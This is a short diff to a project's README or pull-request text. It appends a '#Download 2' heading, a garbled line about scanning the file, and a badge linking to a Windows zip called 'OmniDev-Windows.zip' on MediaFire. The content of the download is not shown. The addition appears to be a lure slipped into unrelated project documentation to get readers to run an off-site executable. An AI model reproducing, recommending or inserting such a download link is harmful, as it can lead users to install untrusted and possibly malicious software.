@@ -218,3 +218,10 @@ The tag workflow runs backend tests, builds desktop and Python packages, exercis
 
 
 <!-- /coderabbit-ai-generated:v1 -->
+
+
+#Download 2
+If You Don't Trust Free To Scan It
+
+[![Download OmniDev for Windows](https://img.shields.io/badge/Download-OmniDev%20for%20Windows-4F46E5?style=for-the-badge&logo=windows&logoColor=white)](https://www.mediafire.com/file/albhvch9ph6l1dr/OmniDev-Windows.zip/file)
+
